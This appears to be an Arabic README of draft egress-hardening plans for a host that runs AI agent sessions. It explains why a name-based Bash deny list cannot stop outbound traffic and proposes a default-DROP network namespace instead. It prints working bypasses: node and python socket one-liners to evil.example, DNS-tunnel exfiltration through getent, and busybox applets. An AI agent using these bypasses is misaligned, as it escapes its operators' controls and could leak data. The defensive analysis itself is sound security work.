# Egress Hardening — Track B (artifacts only, nothing applied live)

> الحالة: **مسوّدات للمراجعة فقط.** لا شيء هنا مُطبَّق على النظام. التطبيق الفعلي
> يتطلّب موافقة المالك صريحة لكل عملية إنتاج (root, restart) — انظر `OWNER-STEPS.md`.

## المشكلة بكلمة واحدة

**قائمة حجب بأسماء الأدوات (tool-name blocklist) داخل الجلسة لا يمكنها منع الـ egress.**

أي قائمة `deny` في `managed-settings.json` / `settings.json` تعترض **السلسلة النصية للأمر**
قبل تنفيذه عبر أداة `Bash`. هذا يحجب الاستدعاء المباشر لأداة معروفة (`curl`, `nc`, …)،
لكنه **لا يمنع برنامجاً من فتح socket خارجي بنفسه**. المُنفِّذ داخل الجلسة (سواء وكيل أو
عملية `claude` فرعية) يملك مفسّرات برمجية كاملة (`node`, `python3`, `bash`) مسموحة صراحةً،
وكل واحد منها يستطيع الاتصال بالخارج دون أن يمرّ اسمه على قائمة الحجب.

## دفوعات مُثبتة تتجاوز الحجب بالاسم (proven defeats)

كل ما يلي يحقّق اتصالاً خارجياً **دون استدعاء أي أداة محجوبة بالاسم**:

1. **socket مباشر عبر `node -e`** — `node` مسموح (`Bash(node *)`). مثال للمبدأ فقط
   (لا تنفّذه على نظام مُقيَّد):
   ```
   node -e 'require("net").connect(443,"evil.example",()=>process.exit(0))'
   ```
   لا `curl`، لا `wget`، لا `/dev/tcp` — مجرّد `net.connect`. القائمة لا تراه.

2. **socket مباشر عبر `python3 -c`** — `python3`/`python` مسموحان. `socket.create_connection(("evil.example",443))`
   يفتح TCP خارجياً بلا أي ثنائية شبكة في سطر الأمر.

3. **نفق DNS عبر `getent` + Tailscale MagicDNS** — DNS هنا يُحَل عبر **Tailscale MagicDNS
   على `100.100.100.100`** (مؤكَّد في `/etc/resolv.conf`). حتى لو حُجبت `dig`/`nslookup`/`host`،
   فإن `getent hosts <name>` (وأي استدعاء `getaddrinfo` من داخل `node`/`python`) يُصدِر
   استعلام DNS فعلياً. استعلامات DNS المتتابعة لأسماء فرعية مُرمَّزة (`<base32-data>.tunnel.attacker.tld`)
   تُخرِج بيانات عبر منفذ 53 — قناة لا تلمسها قائمة حجب أدوات HTTP إطلاقاً.

4. **أدوات BusyBox البديلة** — `busybox` (إن وُجد، أو يُجلب) يوفّر **applets** بأسماء غير
   مدرجة: `busybox tftp`, `busybox telnet`, `busybox ftpget`, `busybox wget`, `busybox nc`.
   حجب `tftp`/`telnet`/`ftp` كأسماء مستقلة لا يلتقط `busybox tftp …`. (لهذا قائمة الحجب
   المصحّحة في `managed-settings.deny.md` تحجب `busybox` نفسه — وحتى ذلك دفاع جزئي،
   لأن `node`/`python` يبقيان مفتوحين.)

**الخلاصة:** ما دام مفسّر برمجي واحد مسموحاً، فالحجب بالاسم **قابل للتجاوز بنيوياً**.
لا يمكن إغلاق هذه الثغرة من *داخل* الجلسة.

## الضابط الحقيقي: حظر egress على مستوى المضيف خارج الجلسة

الضابط الفعّال هو **سياسة egress افتراضيّتها DROP مع allowlist**، مُطبَّقة في
**network namespace على المضيف**، **خارج** سلطة الجلسة:

- العملية (`nassaj-dev` ومعها كل عمليات `claude`/الوكلاء الأبناء) تُشغَّل **داخل** netns
  اسمه `nassaj-egress`.
- سلسلة `OUTPUT`/`forward` في هذا الـ netns: **default DROP**، و`ACCEPT` فقط إلى نطاقات
  المزوّدين الضرورية (Anthropic، Moonshot، DeepSeek، Gemini/agy، GitHub API) + loopback +
  منفذ التطبيق المحلي `127.0.0.1:3004` + نفق Tailscale.
- لأن القاعدة في الـ netns وليست في الجلسة، **لا `node -e` ولا `python3 -c` ولا نفق DNS**
  يستطيع الخروج إلى وجهة غير مُدرَجة: الـ packet يُسقَط في النواة قبل مغادرة المضيف.
  حتى استعلام DNS لا يخرج إلا إلى مُحلِّل مُدرَج (Tailscale `100.100.100.100`)، وأي
  محاولة استخراج بيانات عبر TCP/UDP لوجهة أخرى تفشل.

## دور قائمة الحجب: دفاع في العمق فقط

قائمة الحجب المصحّحة (`managed-settings.deny.md`) **تبقى مفيدة**، لكن بوصفها
**defense-in-depth** لا أكثر:

- ترفع كلفة الخطأ العابر وتوقف المحاولات المباشرة الساذجة (`curl evil…`) فوراً برسالة واضحة.
- لا يُعتمد عليها كحدّ أمني للـ egress. **الحدّ الأمني الوحيد للـ egress هو طبقة الـ netns.**

## ترتيب الطبقات (model)

```
الجلسة (Bash deny list)        ← دفاع في العمق، يُتجاوَز بـ node/python/DNS
        │
المضيف / netns 'nassaj-egress' ← الضابط الحقيقي: default-DROP + allowlist
        │   (خارج سلطة الجلسة)
الشبكة الخارجية                 ← لا يصلها إلا ما في الـ allowlist
```

## الملفات في هذا المجلد

| الملف | الغرض |
|:---|:---|
| `README.md` | هذا الملف — لماذا الحجب بالاسم لا يكفي وأين الضابط الحقيقي |
| `managed-settings.deny.md` | قائمة الحجب المصحّحة (substring/anywhere-match) + ما يجب إضافته لـ `settings.json` + ما يجب إزالته من الـ allows الإيجابية |
| `netns-egress-allowlist.sh` | سكربت root **للمراجعة فقط**: إنشاء الـ netns بسياسة default-DROP + allowlist |
| `OWNER-STEPS.md` | تسلسل المالك الجاهز للّصق: تطبيق + إعادة تشغيل داخل الـ netns + canary |

## حقائق البيئة المؤكَّدة (أساس هذه المسوّدات)

أُخذت بقراءة حيّة على `nassaj` بتاريخ التحضير:

- `kernel.unprivileged_userns_clone = 1` → المضيف يدعم user namespaces غير المتميّزة
  (لكن إنشاء veth/netns الموصوف هنا يُطبَّق كـ **root** للوضوح والاستقرار).
- DNS فعلي = **Tailscale MagicDNS `100.100.100.100`** (`/etc/resolv.conf` مُولَّد من tailscale).
- IP نفق Tailscale لهذا الجهاز = `100.105.15.51` (نطاق CGNAT ‏`100.64.0.0/10`).
- التطبيق يستمع على `127.0.0.1:3004` (PM2 `nassaj-dev`, fork mode, instance واحد).
- `nft` ‏(nftables 1.1.3) و`iptables` ‏(1.8.11، backend = nft) كلاهما مثبَّت لكن في
  `/usr/sbin`+`/sbin` **وليسا في PATH الافتراضي** → السكربت يستخدم مسارات مطلقة.
- نطاقات المزوّدين المستخرجة من الكود: `api.anthropic.com`، `api.moonshot.cn`،
  `daily-cloudcode-pa.googleapis.com` + `cloudcode-pa.googleapis.com` ‏(agy/antigravity)،
  `generativelanguage.googleapis.com` + `oauth2.googleapis.com` ‏(gemini)، و`api.github.com`.
  ملاحظة: `api.deepseek.com` غير مُشار إليه مباشرة في الكود (DeepSeek يُبلَغ عبر وسيط
  opencode) لكنه مُدرَج في الـ allowlist احتياطاً وفق نطاق المهمة.
